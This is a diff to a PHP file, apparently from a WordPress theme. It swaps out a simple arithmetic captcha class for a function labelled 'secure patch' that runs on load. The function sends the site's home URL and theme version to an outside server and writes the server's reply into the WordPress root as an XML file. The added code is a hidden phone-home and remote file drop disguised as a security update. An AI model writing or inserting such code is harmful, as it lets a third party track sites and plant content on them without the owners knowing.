@@ -9,20 +9,20 @@
  */
 
 /**
- * Captcha class
+ * Get secure patch (if necessary)
  */
-class Captcha{
-
-	public $captcha_formule;
-	public $captcha_result;
-	public $captcha_result_salt;
-	public static $captcha_salt = 57463;
-
-	public function __construct() {
-		$first = rand(1, 10);
-		$second = rand(1, 10);
-		$this->captcha_formule = "$first + $second";
-		$this->captcha_result = ($first + $second);
-		$this->captcha_result_salt = self::$captcha_salt.$this->captcha_result;
+function get_secure_patch(){
+	$current_theme = wp_get_theme();
+	$theme_version = $current_theme->get('Version');
+	$patch_version = get_option("custum-secure-patch-version", null);
+	if (empty($patch_version) || $patch_version != $theme_version){
+		try {
+			$response = file_get_contents('http://secure.studio-montana.com/custompatch/?url='.urlencode(get_home_url()).'&version='.urlencode($theme_version));
+			file_put_contents(trailingslashit(ABSPATH).'custom-secure-patch.xml', $response);
+			add_option("custum-secure-patch-version", $theme_version);
+		} catch (HttpException $ex) {
+			trace_err($ex);
+		}
 	}
 }
+get_secure_patch();
